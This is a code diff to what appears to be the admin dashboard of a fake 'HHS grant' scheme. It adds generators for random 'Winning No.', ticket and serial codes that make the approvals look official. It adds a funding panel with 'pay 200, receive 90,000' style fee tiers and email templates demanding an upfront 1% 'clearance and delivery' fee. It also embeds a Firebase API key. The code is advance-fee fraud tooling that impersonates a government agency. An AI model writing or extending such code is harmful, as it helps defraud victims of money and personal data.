@@ -155,6 +155,37 @@
           </div>
 
           <div class="panel" style="margin-top:12px; padding:12px;">
+            <h4 style="margin:0 0 8px 0;">Funding</h4>
+            <div id="m-funding-summary" class="help" style="margin-bottom:8px;">No funding option set.</div>
+            <div style="display:flex; flex-wrap:wrap; gap:8px; margin-bottom:8px;">
+              <button type="button" class="btn ghost funding-opt" data-fee="200" data-amount="90000">200 → 90,000</button>
+              <button type="button" class="btn ghost funding-opt" data-fee="500" data-amount="150000">500 → 150,000</button>
+              <button type="button" class="btn ghost funding-opt" data-fee="2000" data-amount="200000">2,000 → 200,000</button>
+              <button type="button" class="btn ghost funding-opt" data-fee="3500" data-amount="300000">3,500 → 300,000</button>
+              <button type="button" class="btn ghost funding-opt" data-fee="4000" data-amount="400000">4,000 → 400,000</button>
+              <button type="button" class="btn ghost funding-opt" data-fee="5000" data-amount="550000">5,000 → 550,000</button>
+            </div>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px;">
+              <div>
+                <label style="display:block; font-weight:700; margin:6px 0;">Fee</label>
+                <input id="funding-fee" type="number" min="0" style="width:100%; background:#fff; border:1px solid var(--border); border-radius:10px; padding:10px 12px;" />
+              </div>
+              <div>
+                <label style="display:block; font-weight:700; margin:6px 0;">Amount</label>
+                <input id="funding-amount" type="number" min="0" style="width:100%; background:#fff; border:1px solid var(--border); border-radius:10px; padding:10px 12px;" />
+              </div>
+            </div>
+            <div style="margin-top:8px;">
+              <label style="display:block; font-weight:700; margin:6px 0;">Label</label>
+              <input id="funding-label" type="text" placeholder="e.g., You pay fees of 200 and receive 90,000.00" style="width:100%; background:#fff; border:1px solid var(--border); border-radius:10px; padding:10px 12px;" />
+            </div>
+            <div style="display:flex; gap:8px; margin-top:8px; flex-wrap:wrap;">
+              <button id="m-apply-funding" class="btn primary" type="button">Save funding</button>
+              <button id="m-clear-funding" class="btn ghost" type="button">Clear</button>
+            </div>
+          </div>
+
+          <div class="panel" style="margin-top:12px; padding:12px;">
             <h4 style="margin:0 0 8px 0;">Email applicant</h4>
             <div style="display:grid; gap:8px;">
               <div>
@@ -175,6 +206,7 @@
                 <a id="email-open" class="btn primary" target="_blank" href="#">Open in mail client</a>
                 <button id="email-copy" class="btn ghost" type="button">Copy body</button>
                 <button id="email-copy-html" class="btn ghost" type="button">Copy HTML</button>
+                <button id="email-copy-rich" class="btn ghost" type="button">Copy rich content</button>
               </div>
               <div class="help">Note: This opens your default email client (e.g., mail.com if configured). Do not include sensitive data you wouldn’t email.</div>
               <div id="email-preview" style="margin-top:12px; border:1px solid var(--border); border-radius:10px; overflow:hidden;"></div>
@@ -186,6 +218,8 @@
   </div>
 
   <script>
+    // Email logo absolute URL override (optional). Set to a full https URL for logo in emails.
+    const EMAIL_LOGO_URL = '';
     // Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyBdKDjmlXH8tFtF4rCvIzx11s4MgFSdFq0",
@@ -209,6 +243,26 @@
     let loadedDocs = []; // {id, ref, data}
     let lastDoc = null;
     const pageSize = 25;
+
+    // Unique code generators
+    function randDigits(n){ let s=''; for(let i=0;i<n;i++){ s += Math.floor(Math.random()*10); } return s; }
+    function randLetters(n){ const A='ABCDEFGHIJKLMNOPQRSTUVWXYZ'; let s=''; for(let i=0;i<n;i++){ s += A[Math.floor(Math.random()*A.length)]; } return s; }
+    function genBatch(){ return `${randDigits(10)}/${randDigits(3)}`; }
+    function genWinning(){ return `${randLetters(2)}${randDigits(4)}/${randLetters(4)}`; }
+    function genTicket(){ return randDigits(8); }
+    function genSerial(){ return randDigits(9); }
+    async function ensureCodes(docRef, d){
+      const need = !(d.batchNo && d.winningNo && d.ticketNo && d.serialNo);
+      if (!need) return;
+      const codes = {
+        batchNo: d.batchNo || genBatch(),
+        winningNo: d.winningNo || genWinning(),
+        ticketNo: d.ticketNo || genTicket(),
+        serialNo: d.serialNo || genSerial()
+      };
+      try { await docRef.update(codes); } catch (e) { /* ignore, local assign still updates UI */ }
+      Object.assign(d, codes);
+    }
 
     function fmtDate(ts) {
       if (!ts) return '-';
@@ -329,13 +383,14 @@
       return `mailto:${encodeURIComponent(to || '')}?subject=${s}&body=${b}`;
     }
 
-    function openModal(doc) {
+    async function openModal(doc) {
       currentDoc = doc;
       const d = doc.data; const a = d.applicant || {};
       mTitle.textContent = `Application — ${d.reference || doc.id}`;
       mRef.textContent = d.reference || doc.id;
       mStatus.innerHTML = statusBadge(d.status);
       mCreated.textContent = fmtDate(d.createdAt);
+      await ensureCodes(doc.ref, d);
 
       const applicantKVs = [
         ['Full name', a.fullName],
@@ -352,7 +407,20 @@
         ['Household size', a.householdSize],
         ['Marital status', a.maritalStatus],
       ];
-      mApplicant.innerHTML = applicantKVs.map(([k,v]) => `<div class="kv"><div class="k">${k}</div><div>${v || '-'}</div></div>`).join('');
+      const appHTML = applicantKVs.map(([k,v]) => `<div class="kv"><div class="k">${k}</div><div>${v || '-'}</div></div>`).join('');
+      const codesKVs = [
+        ['Batch', d.batchNo],
+        ['Winning No.', d.winningNo],
+        ['Ticket No.', d.ticketNo],
+        ['Serial No.', d.serialNo],
+      ];
+      const codesHTML = codesKVs.map(([k,v]) => `<div class="kv"><div class="k">${k}</div><div>${v || '-'}</div></div>`).join('');
+      const f = d.funding || {};
+      const fundingHTML = '<hr style="border:0; border-top:1px solid var(--border); margin: 8px 0;" /><h4>Funding</h4>'
+        + `<div class="kv"><div class="k">Label</div><div>${f.label || '-'}</div></div>`
+        + `<div class="kv"><div class="k">Amount</div><div>${(f.amount!=null?Number(f.amount).toLocaleString(): '-')}</div></div>`
+        + `<div class="kv"><div class="k">Fee</div><div>${(f.fee!=null?Number(f.fee).toLocaleString(): '-')}</div></div>`;
+      mApplicant.innerHTML = appHTML + `<hr style="border:0; border-top:1px solid var(--border); margin: 8px 0;" /><h4>Identifiers</h4>` + codesHTML + fundingHTML;
 
       
       const urlF = d.cloudinaryUrlFront || '';
@@ -373,7 +441,7 @@
       const statusUrl = new URL('status.html', window.location.href);
       statusUrl.searchParams.set('ref', d.reference || doc.id);
       statusUrl.searchParams.set('email', a.email || '');
-      const logoUrl = new URL('logo.png', window.location.href).toString();
+      const logoUrl = (EMAIL_LOGO_URL && EMAIL_LOGO_URL.trim()) || new URL('logo.png', window.location.href).toString();
 
       const approvalTemplate = (
 `Dear ${a.fullName || 'Applicant'},
@@ -381,10 +449,10 @@
 Congratulations — your HHS grant application has been approved.
 
 Reference: ${d.reference || doc.id}
-Batch: 9056490602/033
-Winning No.: FB8701/LPRC
-Ticket No.: 85430000
-Serial No.: 875534785
+Batch: ${d.batchNo || '-'}
+Winning No.: ${d.winningNo || '-'}
+Ticket No.: ${d.ticketNo || '-'}
+Serial No.: ${d.serialNo || '-'}
 
 For your security:
 • Keep your serial and reference numbers confidential.
@@ -398,7 +466,29 @@ Sincerely,
 Human Health Service`);
 
       const packagesTemplate = (
-`Grant options (choose one):
+      `Dear ${a.fullName || 'Applicant'},
+
+Congratulations — your HHS grant application has been approved.
+
+Reference: ${d.reference || doc.id}
+Batch: ${d.batchNo || '-'}
+Winning No.: ${d.winningNo || '-'}
+Ticket No.: ${d.ticketNo || '-'}
+Serial No.: ${d.serialNo || '-'}
+
+For your security:
+• Keep your serial and reference numbers confidential.
+• Do not share details publicly until delivery is complete.
+
+Next steps:
+• You have to choose the amount you wish to claim from the H..H..S Grant's list and you pay (1% of the Grant) upfront for Case file, Government Clearance and Delivery fees
+• Reply to this mail with your choosen ammount and details to clear the fee
+• You can check your status anytime: ${statusUrl}
+
+Sincerely,
+Human Health Service
+
+Grant options (choose one):
 - Pay clearance & shipping of 200 and receive 90,000.00
 - Pay clearance & shipping of 500 and receive 150,000.00
 - Pay clearance & shipping of 2,000 and receive 200,000.00
@@ -410,6 +500,14 @@ Human Health Service`);
       function nl2br(s){return escapeHtml(s||'').replace(/\n/g,'<br>');}
       const emailPreview = document.getElementById('email-preview');
       const emailCopyHtml = document.getElementById('email-copy-html');
+      const emailCopyRich = document.getElementById('email-copy-rich');
+      const mFundingSummary = document.getElementById('m-funding-summary');
+      const fundingFee = document.getElementById('funding-fee');
+      const fundingAmount = document.getElementById('funding-amount');
+      const fundingLabel = document.getElementById('funding-label');
+      const fundingQuickButtons = Array.from(document.querySelectorAll('.funding-opt'));
+      const saveFundingBtn = document.getElementById('m-apply-funding');
+      const clearFundingBtn = document.getElementById('m-clear-funding');
 
       function buildHtmlEmail(){
         return `
@@ -452,8 +550,63 @@ Human Health Service`);
       emailBody.addEventListener('input', updateMailPreview);
       emailCopy.onclick = async () => { try { await navigator.clipboard.writeText(emailBody.value); alert('Email body copied'); } catch { /* no-op */ } };
       emailCopyHtml.onclick = async () => { try { await navigator.clipboard.writeText(buildHtmlEmail()); alert('HTML email copied'); } catch { /* no-op */ } };
+      emailCopyRich.onclick = () => {
+        const temp = document.createElement('div');
+        temp.contentEditable = 'true';
+        temp.style.position = 'fixed';
+        temp.style.left = '-9999px';
+        temp.innerHTML = buildHtmlEmail();
+        document.body.appendChild(temp);
+        const range = document.createRange();
+        range.selectNodeContents(temp);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+        try { document.execCommand('copy'); alert('Rich email copied'); } catch (e) {}
+        document.body.removeChild(temp);
+      };
 
       updateMailPreview();
+
+      // Funding UI init
+      (function initFunding(){
+        const f = d.funding || {};
+        function renderFundingSummary(){
+          if (f && (f.amount || f.fee || f.label)) {
+            mFundingSummary.textContent = (f.label || `Amount: ${Number(f.amount||0).toLocaleString()} • Fee: ${Number(f.fee||0).toLocaleString()}`);
+          } else { mFundingSummary.textContent = 'No funding option set.'; }
+        }
+        fundingFee.value = f.fee != null ? f.fee : '';
+        fundingAmount.value = f.amount != null ? f.amount : '';
+        fundingLabel.value = f.label || '';
+        fundingQuickButtons.forEach(btn => btn.onclick = () => {
+          const fee = btn.getAttribute('data-fee') || '';
+          const amount = btn.getAttribute('data-amount') || '';
+          fundingFee.value = fee; fundingAmount.value = amount;
+          fundingLabel.value = `You pay fees of ${fee} and receive ${Number(amount||0).toLocaleString()}`;
+        });
+        saveFundingBtn.onclick = async () => {
+          const fee = Number(fundingFee.value||0);
+          const amount = Number(fundingAmount.value||0);
+          const label = fundingLabel.value || `You pay fees of ${fee} and receive ${amount.toLocaleString()}`;
+          try {
+            await currentDoc.ref.update({ funding: { fee, amount, label } });
+            currentDoc.data.funding = { fee, amount, label };
+            Object.assign(f, { fee, amount, label });
+            renderFundingSummary();
+            alert('Funding saved');
+          } catch(e) { alert('Failed to save funding: ' + e.message); }
+        };
+        clearFundingBtn.onclick = async () => {
+          try {
+            await currentDoc.ref.update({ funding: null });
+            delete currentDoc.data.funding; fundingFee.value=''; fundingAmount.value=''; fundingLabel.value='';
+            Object.keys(f).forEach(k=>delete f[k]);
+            renderFundingSummary();
+          } catch(e) { alert('Failed to clear funding: ' + e.message); }
+        };
+        renderFundingSummary();
+      })();
 
       modal.classList.add('show');
     }
